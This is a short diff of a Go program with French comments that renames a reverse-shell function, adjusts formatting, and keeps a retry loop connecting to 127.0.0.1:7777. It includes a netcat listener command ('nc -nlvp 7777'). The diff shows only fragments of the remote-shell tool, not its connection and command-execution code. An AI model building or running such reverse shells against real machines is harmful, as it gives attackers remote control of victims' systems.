@@ -11,7 +11,7 @@ import (
 /*
 La fonction shell est ici pour faire du reverse shell, le parametre de la fonction est au format IP:PORT
 */
-func shell(host string) {
+func reverse_shell(host string) {
 
 	stderr := os.Stderr
 	stdout := os.Stdout
@@ -21,10 +21,10 @@ func shell(host string) {
 		if nil != conn {
 			conn.Close() // ferme la connexion si err == nil et que la connexion est initialisee, permet de fermer proprement
 		}
-		for i := 1; i <= 5; i++ { // la boucle ici pernet de relancer une connexion si cela echoue 5 tentatives avant de fermer la connexion
+		for i:=1 ; i <= 5; i++ { // la boucle ici pernet de relancer une connexion si cela echoue 5 tentatives avant de fermer la connexion
 			fmt.Fprintf(stderr, "ERREUR - Connexion a l'hote impossible\nPour essayer en local : nc -nlvp 7777\n")
 			time.Sleep(5 * time.Second)
-			shell(host)
+			reverse_shell(host)
 		}
 		fmt.Fprintf(stderr, "ECHEC - Connexion a l'hote impossible apres 5 essais\n")
 		os.Exit(1) // EXIT == 1 - Exit avec erreur
@@ -39,11 +39,11 @@ func shell(host string) {
 
 	fmt.Fprintf(stdout, "Connexion Fermee\n")
 	os.Exit(0) // EXIT == 0 - Exit sans erreur
-
+	
 }
 
 func main() {
 
-	shell("127.0.0.1:7777")
+	reverse_shell("127.0.0.1:7777")
 
 }
